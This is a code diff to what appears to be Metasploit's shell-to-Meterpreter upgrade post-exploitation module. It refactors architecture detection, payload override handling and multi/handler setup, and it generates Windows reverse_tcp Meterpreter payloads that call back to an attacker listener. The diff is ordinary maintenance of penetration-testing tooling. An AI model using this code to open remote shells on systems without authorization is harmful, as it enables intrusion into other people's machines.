@@ -6,6 +6,7 @@ require 'rex/exploitation/cmdstager'
 
 class MetasploitModule < Msf::Post
   include Exploit::Powershell
+  include Post::Architecture
   include Post::Windows::Powershell
 
   def initialize(info = {})
@@ -84,19 +85,19 @@ class MetasploitModule < Msf::Post
     when 'windows', 'win'
       platform = 'windows'
       lplat = [Msf::Platform::Windows]
-      arch = cmd_exec('wmic os get osarchitecture')
-      if arch =~ /64-bit/m
+      arch = get_os_architecture
+      case arch
+      when ARCH_X64
         payload_name = 'windows/x64/meterpreter/reverse_tcp'
-        larch = [ARCH_X64]
         psh_arch = 'x64'
-      elsif arch =~ /32-bit/m
+      when ARCH_X86
         payload_name = 'windows/meterpreter/reverse_tcp'
-        larch = [ARCH_X86]
         psh_arch = 'x86'
       else
         print_error('Target is running Windows on an unsupported architecture such as Windows ARM!')
         return nil
       end
+      larch = [arch]
       vprint_status('Platform: Windows')
     when 'osx'
       platform = 'osx'
@@ -131,13 +132,15 @@ class MetasploitModule < Msf::Post
         vprint_status('Platform: Python [fallback]')
       end
     end
-    payload_name = datastore['PAYLOAD_OVERRIDE'] if datastore['PAYLOAD_OVERRIDE']
-    vprint_status("Upgrade payload: #{payload_name}")
 
     if platform.blank?
       print_error("Shells on the target platform, #{session.platform}, cannot be upgraded to Meterpreter at this time.")
       return nil
     end
+
+    payload_name = datastore['PAYLOAD_OVERRIDE'] if datastore['PAYLOAD_OVERRIDE']
+
+    vprint_status("Upgrade payload: #{payload_name}")
 
     payload_data = generate_payload(lhost, lport, payload_name)
     if payload_data.blank?
@@ -207,7 +210,8 @@ class MetasploitModule < Msf::Post
       vprint_status('Cleaning up handler')
       cleanup_handler(listener_job_id, aborted)
     end
-    return nil
+
+    nil
   end
 
   #
@@ -283,7 +287,7 @@ class MetasploitModule < Msf::Post
         # for an unlimited amount of time for the newly spawned session to exit.
         wait_for_cmd_result = i + 1 < cmds.length
         # Note that non-channelized cmd_exec calls currently return an empty string
-        ret = cmd_exec(cmds.last, nil, command_timeout, { 'Channelized' => wait_for_cmd_result })
+        ret = cmd_exec(cmd, nil, command_timeout, { 'Channelized' => wait_for_cmd_result })
         if wait_for_cmd_result
           if !ret
             aborted = true
@@ -359,47 +363,55 @@ class MetasploitModule < Msf::Post
   # Starts a exploit/multi/handler session
   def create_multihandler(lhost, lport, payload_name)
     pay = client.framework.payloads.create(payload_name)
+    pay.datastore['RHOST'] = rhost
     pay.datastore['LHOST'] = lhost
     pay.datastore['LPORT'] = lport
+
     print_status('Starting exploit/multi/handler')
-    if !check_for_listener(lhost, lport)
-      # Set options for module
-      mh = client.framework.exploits.create('multi/handler')
-      mh.share_datastore(pay.datastore)
-      mh.datastore['WORKSPACE'] = client.workspace
-      mh.datastore['PAYLOAD'] = payload_name
-      mh.datastore['EXITFUNC'] = 'thread'
-      mh.datastore['ExitOnSession'] = true
-      # Validate module options
-      mh.options.validate(mh.datastore)
-      # Execute showing output
-      mh.exploit_simple(
-        'Payload' => mh.datastore['PAYLOAD'],
-        'LocalInput' => user_input,
-        'LocalOutput' => user_output,
-        'RunAsJob' => true
-      )
 
-      # Check to make sure that the handler is actually valid
-      # If another process has the port open, then the handler will fail
-      # but it takes a few seconds to do so.  The module needs to give
-      # the handler time to fail or the resulting connections from the
-      # target could end up on on a different handler with the wrong payload
-      # or dropped entirely.
-      select(nil, nil, nil, 5)
-      return nil if framework.jobs[mh.job_id.to_s].nil?
-
-      return mh.job_id.to_s
-    else
+    if check_for_listener(lhost, lport)
       print_error('A job is listening on the same local port')
-      return nil
+      return
     end
+
+    # Set options for module
+    mh = client.framework.exploits.create('multi/handler')
+    mh.share_datastore(pay.datastore)
+    mh.datastore['WORKSPACE'] = client.workspace
+    mh.datastore['PAYLOAD'] = payload_name
+    mh.datastore['EXITFUNC'] = 'thread'
+    mh.datastore['ExitOnSession'] = true
+    # Validate module options
+    mh.options.validate(mh.datastore)
+    # Execute showing output
+    mh.exploit_simple(
+      'Payload' => mh.datastore['PAYLOAD'],
+      'LocalInput' => user_input,
+      'LocalOutput' => user_output,
+      'RunAsJob' => true
+    )
+
+    # Check to make sure that the handler is actually valid
+    # If another process has the port open, then the handler will fail
+    # but it takes a few seconds to do so.  The module needs to give
+    # the handler time to fail or the resulting connections from the
+    # target could end up on on a different handler with the wrong payload
+    # or dropped entirely.
+    select(nil, nil, nil, 5)
+    return nil if framework.jobs[mh.job_id.to_s].nil?
+
+    mh.job_id.to_s
   end
 
   def generate_payload(lhost, lport, payload_name)
     payload = framework.payloads.create(payload_name)
-    options = "LHOST=#{lhost} LPORT=#{lport}"
-    buf = payload.generate_simple('OptionStr' => options)
-    buf
+
+    unless payload.respond_to?('generate_simple')
+      print_error("Could not generate payload #{payload_name}. Invalid payload?")
+      return
+    end
+
+    options = "LHOST=#{lhost} LPORT=#{lport} RHOST=#{rhost}"
+    payload.generate_simple('OptionStr' => options)
   end
 end
